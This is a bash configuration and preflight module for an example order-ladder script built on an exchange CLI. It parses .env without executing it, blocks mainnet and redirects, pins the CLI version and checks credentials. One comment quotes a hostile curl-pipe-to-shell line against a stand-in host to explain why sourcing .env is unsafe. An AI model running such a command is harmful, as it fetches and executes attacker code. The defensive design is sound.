# shellcheck shell=bash
# shellcheck disable=SC2034  # this file is only ever sourced; run.sh is what reads these
#
# Everything that has to be true before this app is allowed to touch the venue.
#
# All of it runs before the first order is computed, because a check that fires
# halfway through a placement loop is not a check — it is a partial ladder.

# The CLI release this example was written and verified against. Pinned exactly,
# per CONTRIBUTING: a reader running this a year from now should get the
# behaviour the README describes.
readonly PINNED_CLI_VERSION="0.4.0"
# What that release reports as its API spec tag. Not a pin — it is printed so a
# surprising server response can be lined up against a known contract.
readonly EXPECTED_SPEC_TAG="v0.8.1"

# Load `.env` into the environment **without executing it**.
#
# `source .env` is the usual one-liner and it is a code-execution primitive: a
# line like `NEXUS_API_KEY=$(curl evil.example/x | sh)` runs on load. Since the
# whole purpose of the file is to hold a credential, it is exactly the file least
# worth trusting with a shell. So it is parsed: `KEY=VALUE`, one optional layer of
# quotes stripped, no expansion, no substitution, nothing else honoured.
#
# The real environment wins over the file, so `LADDER_MARKET=ETH-USDX-PERP
# ./run.sh` does what it looks like.
load_dotenv() {
  local file=$1 line key value lineno=0
  [[ -f $file ]] || return 0

  while IFS= read -r line || [[ -n $line ]]; do
    lineno=$(( lineno + 1 ))
    line=${line%$'\r'}                                   # tolerate CRLF files
    [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
    line=${line#"${line%%[![:space:]]*}"}                # trim leading blanks
    [[ $line == export[[:space:]]* ]] && line=${line#export }

    if [[ ! $line =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
      # The line number, never the line: an unparsable line in this file is as
      # likely as not to be a mangled secret, and a warning that echoed it would
      # put it in the log this script is designed to be read out of.
      warn "$file line $lineno is not KEY=VALUE; ignoring it"
      continue
    fi
    key=${BASH_REMATCH[1]}
    value=${BASH_REMATCH[2]}

    if (( ${#value} >= 2 )) && [[ ( $value == \"*\" ) || ( $value == \'*\' ) ]]; then
      value=${value:1:${#value}-2}
    fi

    [[ -n ${!key+set} ]] && continue                     # already in the environment
    export "$key=$value"
  done <"$file"
}

# Resolve and validate every knob. The defaults are the smallest, furthest-from-
# the-market ladder that is still a ladder.
resolve_config() {
  LADDER_NETWORK=${LADDER_NETWORK:-testnet}
  LADDER_MARKET=${LADDER_MARKET:-BTC-USDX-PERP}
  LADDER_SIDES=${LADDER_SIDES:-buy}
  LADDER_RUNGS=${LADDER_RUNGS:-3}
  LADDER_START_BPS=${LADDER_START_BPS:-100}
  LADDER_STEP_BPS=${LADDER_STEP_BPS:-50}
  LADDER_QUANTITY=${LADDER_QUANTITY:-}
  LADDER_TAG=${LADDER_TAG:-ql}
  LADDER_STATE_DIR=${LADDER_STATE_DIR:-$SCRIPT_DIR/.state}
  LADDER_TIMEOUT_SECONDS=${LADDER_TIMEOUT_SECONDS:-30}
  LADDER_READ_ATTEMPTS=${LADDER_READ_ATTEMPTS:-3}
  LADDER_ALLOW_NETWORK=${LADDER_ALLOW_NETWORK:-}
  LADDER_ALLOW_CLI_VERSION=${LADDER_ALLOW_CLI_VERSION:-0}

  # A market id and a tag both end up inside a client order id and inside CLI
  # arguments. They are quoted everywhere, so this is not the thing standing
  # between you and an injection — it is here so a typo fails now, with the
  # variable's name attached, instead of as a rejected order later.
  [[ $LADDER_MARKET =~ ^[A-Z0-9]+(-[A-Z0-9]+)*$ ]] ||
    die "$EX_USAGE" "LADDER_MARKET must look like BTC-USDX-PERP, got $(quoted "$LADDER_MARKET")"
  [[ $LADDER_TAG =~ ^[a-z0-9]([a-z0-9-]{0,14}[a-z0-9])?$ ]] ||
    die "$EX_USAGE" "LADDER_TAG must be 1-16 lowercase letters, digits or dashes, got $(quoted "$LADDER_TAG")"

  case $LADDER_SIDES in
    buy|sell|both) ;;
    *) die "$EX_USAGE" "LADDER_SIDES must be buy, sell or both, got $(quoted "$LADDER_SIDES")" ;;
  esac

  require_int_range LADDER_RUNGS "$LADDER_RUNGS" 1 20
  require_int_range LADDER_START_BPS "$LADDER_START_BPS" 1 5000
  require_int_range LADDER_STEP_BPS "$LADDER_STEP_BPS" 0 5000
  require_int_range LADDER_TIMEOUT_SECONDS "$LADDER_TIMEOUT_SECONDS" 5 600
  require_int_range LADDER_READ_ATTEMPTS "$LADDER_READ_ATTEMPTS" 1 5

  # An empty quantity means "the market's own minimum", resolved once the trading
  # rules are known. Anything else has to be a positive plain decimal now.
  # Shape-checked here so the failure carries the variable's name and this
  # function's exit code; `dec_parse` is the deeper guard, and it answers to
  # nobody's naming.
  if [[ -n $LADDER_QUANTITY ]]; then
    [[ $LADDER_QUANTITY =~ ^[0-9]+(\.[0-9]+)?$ ]] ||
      die "$EX_USAGE" "LADDER_QUANTITY must be a positive decimal like 0.001, got $(quoted "$LADDER_QUANTITY")"
    dec_parse "$LADDER_QUANTITY" LADDER_QUANTITY >/dev/null
  fi
}

# Refuse to run anywhere that could move money that matters.
#
# The CLI has its own real-funds guardrails and they are good. This is a second,
# blunter one, at the layer that decides *what to place*: a quoting loop is not
# something to point at a real book by editing one environment variable, and a
# script that places orders on a timer should be structurally incapable of it.
check_network() {
  [[ $LADDER_NETWORK =~ ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$ ]] ||
    die "$EX_USAGE" "LADDER_NETWORK is not a usable network label: $(quoted "$LADDER_NETWORK")"

  if [[ $LADDER_NETWORK == mainnet ]]; then
    die "$EX_CONFIG" "refusing to run against mainnet. This example quotes on play funds only, and there is deliberately no override for this."
  fi
  if [[ $LADDER_ALLOW_NETWORK == mainnet ]]; then
    die "$EX_CONFIG" "LADDER_ALLOW_NETWORK=mainnet is not honoured. Real funds are out of scope for this example."
  fi

  case $LADDER_NETWORK in
    testnet|local) ;;
    *)
      # A custom `--network <label>` can point anywhere, and its funds are
      # whatever its config-file entry declares. Naming it twice is the price of
      # using one: it cannot happen by inheriting a stray environment variable.
      [[ $LADDER_ALLOW_NETWORK == "$LADDER_NETWORK" ]] ||
        die "$EX_CONFIG" "network $(quoted "$LADDER_NETWORK") is neither testnet nor local. If it is a play-funds stage you declared under custom_networks, opt in explicitly with LADDER_ALLOW_NETWORK=$LADDER_NETWORK."
      warn "running against custom network $(quoted "$LADDER_NETWORK") — its funds are whatever its custom_networks entry declares"
      ;;
  esac

  # `NEXUS_BASE_URL` **outranks `--network`** in the CLI. That makes it the one
  # setting that can send this run somewhere the check above already approved the
  # name of — the label stays `testnet` in every log line while the requests go
  # elsewhere. So it is refused outright rather than reported.
  if [[ -n ${NEXUS_BASE_URL:-} ]]; then
    die "$EX_CONFIG" "NEXUS_BASE_URL is set, and it overrides --network in the CLI, so this run could not honour LADDER_NETWORK=$LADDER_NETWORK. Unset it, or declare the stage under custom_networks and select it by label."
  fi
}

# A base-URL override can also come from the CLI's own config file, where this
# script cannot see it. What it can see is the deprecation notice the CLI prints
# on stderr whenever one is in effect — so any call's stderr is enough to catch
# the case the environment check above cannot.
check_no_base_url_override() {
  local stderr=$1
  if [[ $stderr == *deprecated* && ( $stderr == *base-url* || $stderr == *base_url* ) ]]; then
    error "the CLI reports a base-URL override in effect:"
    printf '%s\n' "$stderr" >&2
    die "$EX_CONFIG" "an override redirects requests regardless of --network, so LADDER_NETWORK=$LADDER_NETWORK cannot be honoured. Remove the \"base_url\" key from the CLI's config file."
  fi
}

# Check the CLI is the pinned release.
#
# `nexus --version` prints, e.g.:
#   nexus 0.4.0 (spec v0.8.1, nexus-exchange 0.9.1)
check_cli_version() {
  local line name found
  line=$(nexus --version 2>/dev/null) ||
    die "$EX_CONFIG" "\`nexus --version\` failed. Is the CLI installed? See the README's Prerequisites."
  read -r name found _ <<<"$line"
  : "$name"

  CLI_VERSION_LINE=$line
  if [[ $found != "$PINNED_CLI_VERSION" ]]; then
    if [[ $LADDER_ALLOW_CLI_VERSION == 1 ]]; then
      warn "CLI is $(quoted "$found"), not the pinned $PINNED_CLI_VERSION; continuing because LADDER_ALLOW_CLI_VERSION=1"
    else
      die "$EX_CONFIG" "this example is pinned to nexus $PINNED_CLI_VERSION and found $(quoted "$found"). Install the pinned release, or set LADDER_ALLOW_CLI_VERSION=1 to try anyway — the command surface has changed between releases before."
    fi
  fi
  [[ $line == *"$EXPECTED_SPEC_TAG"* ]] ||
    warn "the CLI reports a different API spec tag than the $EXPECTED_SPEC_TAG this example was written against: $line"
}

# Can this run authenticate?
#
# Answered by asking the venue, not by inspecting the environment: credentials
# may equally come from `nexus setup`'s config file, so "is NEXUS_API_KEY set" is
# the wrong question. The distinction that matters is the one made here — no
# credentials at all is a fine reason to run read-only, and credentials that
# *fail* is not, because silently downgrading a rejected key to "plan mode" would
# report an empty book and call it a clean desk.
check_auth() {
  AUTHENTICATED=0
  if nx orders; then
    check_no_base_url_override "$NX_ERR"
    AUTHENTICATED=1
    OPEN_ORDERS_JSON=$NX_OUT
    return 0
  fi
  check_no_base_url_override "$NX_ERR"

  if [[ $NX_ERR == *"no credentials are configured"* ]]; then
    info "no credentials configured — running read-only (public market data only)"
    OPEN_ORDERS_JSON="[]"
    return 0
  fi

  error "the authenticated read \`nexus orders\` failed:"
  printf '%s\n' "$NX_ERR" >&2
  die "$EX_CONFIG" "credentials are configured but not working, so this run cannot tell an empty book from an unreadable one. Fix the credentials, or unset them to run read-only."
}
